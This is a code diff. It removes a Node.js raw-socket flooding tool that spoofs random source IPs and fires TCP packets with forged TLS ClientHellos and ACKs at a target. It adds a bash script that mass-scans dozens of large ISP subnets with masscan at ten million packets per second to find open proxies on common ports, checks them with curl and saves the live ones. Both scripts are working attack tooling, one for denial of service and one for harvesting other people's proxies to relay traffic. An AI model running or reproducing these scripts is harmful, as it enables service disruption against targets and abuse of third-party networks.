@@ -1,121 +1,71 @@
-const raw = require('raw-socket');
-const cluster = require('cluster');
-const os = require('os');
-const crypto = require('crypto');
+#!/bin/bash
 
-const [,, targetIP, targetPort, threads, duration] = process.argv;
+SUBNETS=(
+    "14.241.0.0/16"
+    "27.72.0.0/16"
+    "113.161.0.0/16"
+    "171.224.0.0/16"
+    "116.98.0.0/16"
+    "36.112.0.0/12"
+    "27.184.0.0/13"
+    "42.236.0.0/14"
+    "61.232.0.0/14"
+    "112.96.0.0/12"
+    "24.0.0.0/12"
+    "67.64.0.0/12"
+    "73.88.0.0/14"
+    "98.160.0.0/11"
+    "99.100.0.0/14"
+    "5.128.0.0/11"
+    "46.174.0.0/16"
+    "77.120.0.0/14"
+    "80.240.0.0/12"
+    "91.226.0.0/15"
+    "80.128.0.0/10"
+    "78.128.0.0/10"
+    "89.0.0.0/10"
+    "85.0.0.0/9"
+    "217.160.0.0/11"
+    "103.105.76.0/24"
+    "103.179.139.0/24"
+    "103.160.202.0/24"
+    "80.240.0.0/12"
+    "91.226.0.0/15"
+)
 
-if (!targetIP || !targetPort || !threads || !duration) {
-    console.log('Usage: node flood.js <ip> <port> <threads> <duration>');
-    process.exit(1);
+PORTS="10001,10002,10004,10005,10006,10007,10008,10009,10010,16000,20959,3000,8080,3128,8000,8888,5000,4000,5001,5002,5003,5004,5005,4001,4002,4003,4004,4005,3333,4444,5555"
+
+RATE="10000000"
+RAW_SCAN="raw_scan_result.txt"
+TEMP="temp_scan.txt"
+OUTPUT="live_proxies.txt"
+
+check_proxy() {
+    local proxy=$1
+    if timeout 5 curl -s --proxy http://$proxy http://httpbin.org/ip --max-time 5 > /dev/null; then
+        echo "[LIVE] $proxy"
+        echo "$proxy" >> "$OUTPUT"
+    else
+        echo "[DEAD] $proxy"
+    fi
 }
 
-function checksum(buf) {
-    let sum = 0;
-    for (let i = 0; i < buf.length; i += 2) {
-        sum += buf.readUInt16BE(i);
-        if (sum > 0xffff) sum -= 0xffff;
-    }
-    return (~sum) & 0xffff;
-}
+export -f check_proxy
+export OUTPUT
 
-function ip2buffer(ip) {
-    return Buffer.from(ip.split('.').map(e => parseInt(e)));
-}
+for SUBNET in "${SUBNETS[@]}"; do
+    echo "[*] Scanning $SUBNET ports $PORTS ..."
+    sudo masscan "$SUBNET" -p"$PORTS" --rate="$RATE" --wait=0 -oL - \
+        | tee -a "$RAW_SCAN" \
+        | awk '/open/ {print $4 ":" $3}' >> "$TEMP"
+done
 
-function randomIP() {
-    return Array(4).fill(0).map(() => Math.floor(Math.random() * 254) + 1).join('.');
-}
+sort -u "$TEMP" > "${TEMP}.unique"
+mv "${TEMP}.unique" "$TEMP"
 
-function buildTLSClientHello() {
-    const tls = Buffer.from([
-        0x16, 0x03, 0x01, 0x00, 0xdc, 
-        0x01, 0x00, 0x00, 0xd8,       
-        0x03, 0x03,                   
-        ...crypto.randomBytes(32),    
-        0x00,                         
-        0x00, 0x20,                   
-        0x13, 0x01, 0x13, 0x02, 0x13, 0x03, 0xc0, 0x2c,
-        0xc0, 0x30, 0x00, 0x9f, 0xcc, 0xa9, 0xcc, 0xa8,
-        0xcc, 0xaa, 0xc0, 0x2b, 0xc0, 0x2f, 0x00, 0x9e,
-        0x00, 0x6b, 0x00, 0x6a, 0x00, 0x39, 0x00, 0x33,
-        0x00, 0x67, 0x00, 0x40,       
-        0x01, 0x00,                   
-        0x00, 0x81,                   
-        ...crypto.randomBytes(100)
-    ]);
-    return tls;
-}
+echo "[*] Verifikasi proxy (total $(wc -l < "$TEMP")) ..."
+cat "$TEMP" | xargs -P 300 -I{} bash -c 'check_proxy "$@"' _ {}
 
-function buildTCPPacket(srcIP, dstIP, srcPort, dstPort, flags, payload) {
-    const ipHeader = Buffer.alloc(20);
-    const tcpHeader = Buffer.alloc(20);
-    const totalLength = ipHeader.length + tcpHeader.length + (payload ? payload.length : 0);
-
-    ipHeader[0] = 0x45;
-    ipHeader[1] = 0x00;
-    ipHeader.writeUInt16BE(totalLength, 2);
-    ipHeader.writeUInt16BE(crypto.randomBytes(2).readUInt16BE(0), 4);
-    ipHeader.writeUInt16BE(0x4000, 6);
-    ipHeader[8] = 64;
-    ipHeader[9] = 6;
-    ip2buffer(srcIP).copy(ipHeader, 12);
-    ip2buffer(dstIP).copy(ipHeader, 16);
-    ipHeader.writeUInt16BE(checksum(ipHeader), 10);
-
-    tcpHeader.writeUInt16BE(srcPort, 0);
-    tcpHeader.writeUInt16BE(dstPort, 2);
-    tcpHeader.writeUInt32BE(crypto.randomBytes(4).readUInt32BE(0), 4);
-    tcpHeader.writeUInt32BE(0, 8);
-    tcpHeader[12] = (5 << 4);
-    tcpHeader[13] = flags;
-    tcpHeader.writeUInt16BE(0x7110, 14);
-    tcpHeader.writeUInt16BE(0, 16);
-    tcpHeader.writeUInt16BE(0, 18);
-
-    const pseudoHeader = Buffer.concat([
-        ip2buffer(srcIP),
-        ip2buffer(dstIP),
-        Buffer.from([0x00, 0x06]),
-        Buffer.alloc(2, tcpHeader.length + (payload ? payload.length : 0)),
-        tcpHeader,
-        payload || Buffer.alloc(0)
-    ]);
-
-    const tcpChecksum = checksum(pseudoHeader);
-    tcpHeader.writeUInt16BE(tcpChecksum, 16);
-
-    return Buffer.concat([ipHeader, tcpHeader, payload || Buffer.alloc(0)]);
-}
-
-function flood() {
-    const socket = raw.createSocket({ protocol: raw.Protocol.None });
-    const end = Date.now() + (Number(duration) * 1000);
-
-    function send() {
-        if (Date.now() > end) process.exit();
-
-        const srcIP = randomIP();
-        const srcPort = Math.floor(Math.random() * 60000) + 1024;
-        const tlsHello = buildTLSClientHello();
-        const packet = buildTCPPacket(srcIP, targetIP, srcPort, targetPort, 0x18, tlsHello); 
-
-        socket.send(packet, 0, packet.length, targetIP, function (err) {
-            if (err) console.error('Error:', err);
-        });
-
-        const ackOnly = buildTCPPacket(srcIP, targetIP, srcPort, targetPort, 0x10); 
-        socket.send(ackOnly, 0, ackOnly.length, targetIP, function (err) {
-            if (err) console.error('Error:', err);
-        });
-    }
-
-    setInterval(send, 0);
-}
-
-if (cluster.isMaster) {
-    console.log(`Flood to ${targetIP}:${targetPort}`);
-    for (let i = 0; i < threads; i++) cluster.fork();
-} else {
-    flood();
-}
+echo "[✓] Scan selesai."
+echo "  → Hasil scan masscan: $RAW_SCAN"
+echo "  → Proxy aktif       : $OUTPUT"
